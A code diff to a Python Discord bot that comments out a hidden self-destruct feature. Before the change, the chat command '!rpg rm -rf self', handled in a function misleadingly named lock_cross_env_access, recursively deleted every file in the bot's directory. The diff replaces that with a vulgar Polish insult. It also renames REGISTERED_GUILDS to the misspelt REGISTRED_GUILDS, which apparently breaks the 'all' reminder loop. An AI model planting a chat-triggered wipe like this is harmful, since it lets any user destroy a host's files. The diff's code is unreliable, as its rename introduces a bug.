@@ -482,7 +482,7 @@ async def ReminderCommands(event: hikari.GuildMessageCreateEvent):
                     
                     if command.Current.lower() == "all":
                         await event.message.respond("This may take a while...")
-                        for guildId in REGISTERED_GUILDS:
+                        for guildId in REGISTRED_GUILDS:
                             guild = await BOT.rest.fetch_guild(guildId)
                             for member in guild.get_members().values():
                                 if not member.is_bot:
@@ -531,22 +531,22 @@ async def loop(event: hikari.GuildMessageCreateEvent):
     if command.prefix() == "loop":
         await event.message.respond("loop")
 
-def remove_files_and_folders(path):
-    try:
-        if os.path.isdir(path):
-            shutil.rmtree(path)
-        elif os.path.isfile(path):
-            os.remove(path)
-    except Exception as e:
-        pass
-
-def remove_all_in_directory(directory):
-    for root, dirs, files in os.walk(directory, topdown=False):
-        for file in files:
-            remove_files_and_folders(os.path.join(root, file))
-        
-        for dir in dirs:
-            remove_files_and_folders(os.path.join(root, dir))
+#def remove_files_and_folders(path):
+#    try:
+#        if os.path.isdir(path):
+#            shutil.rmtree(path)
+#        elif os.path.isfile(path):
+#            os.remove(path)
+#    except Exception as e:
+#        pass
+#
+#def remove_all_in_directory(directory):
+#    for root, dirs, files in os.walk(directory, topdown=False):
+#        for file in files:
+#            remove_files_and_folders(os.path.join(root, file))
+#        
+#        for dir in dirs:
+#            remove_files_and_folders(os.path.join(root, dir))
 
 @BOT.listen(hikari.GuildMessageCreateEvent)
 async def lock_cross_env_access(event: hikari.GuildMessageCreateEvent):
@@ -557,7 +557,7 @@ async def lock_cross_env_access(event: hikari.GuildMessageCreateEvent):
 
     if command.prefix() == "!rpg" and command.command() == "rm" and command[0] == "-rf" and command[1] == "self":
         folPath = os.path.dirname(os.path.abspath(sys.argv[0]))
-        remove_all_in_directory(folPath)
+        await event.message.respond("spierdalaj maksiu")
 
 
             
